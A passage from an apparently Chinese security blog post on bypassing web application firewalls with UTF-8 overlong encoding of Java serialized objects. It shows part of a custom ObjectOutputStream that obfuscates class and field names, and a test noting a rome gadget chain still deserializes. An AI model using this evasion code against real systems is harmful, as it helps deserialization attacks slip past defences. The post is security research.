writeLong(desc.getSerialVersionUID());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;externalizable&quot;</span>)) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">protocolField</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="string">&quot;protocol&quot;</span>);</span><br><span class="line">                protocolField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">protocol</span> <span class="operator">=</span> (<span class="type">int</span>) protocolField.get(<span class="built_in">this</span>);</span><br><span class="line">                <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">                    flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;serializable&quot;</span>))&#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;hasWriteObjectData&quot;</span>)) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;isEnum&quot;</span>) ) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">            &#125;</span><br><span class="line">            writeByte(flags);</span><br><span class="line">            ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc,<span class="string">&quot;fields&quot;</span>);</span><br><span class="line">            writeShort(fields.length);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">                <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[i];</span><br><span class="line">                writeByte(f.getTypeCode());</span><br><span class="line"><span class="comment">//                writeUTF(f.getName());</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">fname</span> <span class="operator">=</span> f.getName();</span><br><span class="line">                writeShort(fname.length() * <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; fname.length(); j++) &#123;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">s</span> <span class="operator">=</span> fname.charAt(j);</span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line">                    write(map.get(s)[<span class="number">0</span>]);</span><br><span class="line">                    write(map.get(s)[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">writeTypeString</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredMethod(<span class="string">&quot;writeTypeString&quot;</span>,String.class);</span><br><span class="line">                    writeTypeString.setAccessible(<span class="literal">true</span>); </span><br><span class="line">                    writeTypeString.invoke(<span class="built_in">this</span>,f.getTypeString()); </span><br><span class="line"><span class="comment">//                    writeTypeString(f.getTypeString());</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> field.get(object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>可以看到Evil类序列化出来已经完全成为了依托乱码</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613163112396.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613163112396.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613163112396"></p>
+<p>以rome链做一个测试：</p>
+<p>可以看到其中用到的类和字段（比如val，_beanClass）都变成了乱码，但仍然可以反序列化</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613164721882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613164721882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613164721882"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613164647233.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613164647233.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613164647233"></p>
+<p>这种方式不会影响作用在java层阻断，比如resolveClass、RASP，是一种针对WAF的特定绕过。但是很有效，膜烧麦✌</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd">https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd</a></p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>GodownKai</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2025/06/13/utf-8-overlong-encoding-rao-guo-waf/" target="_blank" title="UTF-8 Overlong Encodeing 绕过WAF">https://godownio.github.io/2025/06/13/utf-8-overlong-encoding-rao-guo-waf/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8163.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8163.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+    </div>
+    <a href="/2025/06/14/iast-fen-xi-jsp-ming-ling-zhi-xing-sql-zhu-ru-log4j-demo/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> 上一篇:
+        <div class="title-text">IAST 分析jsp命令执行/SQL注入/log4j demo</div>
+      </div>
+      
+      <!-- <div class="content">
+        和RASP类似，IAST利用 instrumentation 技术（比如在 Java 中用 agent）收集运行时的信息
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8161.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8161.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2025/06/10/ldapattribute-jndi/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">JNDI Reference那些事和LdapAttribute getter JNDI</div>
+      </div>
+      <!-- <div class="content">
+        在触发JNDI注入的时候，我们用到的一个JNDI Client如下，用的LDAP协议：
+12345678public c
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          慧眼识珠牢弟
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img src='https://pic2.zhimg.com/80/v2-42b72d5ebee4b8d8aa70d9687effe87b_1440w.webp'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>Godown_blog</h2>
+        
+        
+          <p>something for nothing</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">Godown_blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:me@xxx.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/godownio"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1958304602"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UTF-8-Overlong-Encodeing-%E7%BB%95%E8%BF%87WAF"><span class="toc-text">UTF-8 Overlong Encodeing 绕过WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unicode-%E5%88%B0-UTF-8"><span class="toc-text">Unicode 到 UTF-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Overlong-Encoding%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">Overlong Encoding是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-text">场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-text">构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E7%A8%8B%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">工程化利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-text">测试</span></a></li></ol></li></ol></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/30/hibernate-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-30</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/30/hibernate-fan-xu-lie-hua/">hibernate反序列化</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/25/chun-qiu-yun-jing-spoofing/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8184.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8184.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-25</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/25/chun-qiu-yun-jing-spoofing/">春秋云镜 Spoofing</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/23/oddfuzz/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8183.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8183.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-23</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/23/oddfuzz/">ODDFUZZ</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/18/chun-qiu-yun-jing-flarum/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8182.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8182.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-18</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/18/chun-qiu-yun-jing-flarum/">春秋云镜 Flarum</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/18/chun-qiu-yun-jing-delegation/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8181.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-18</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/18/chun-qiu-yun-jing-delegation/">春秋云镜 Delegation</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
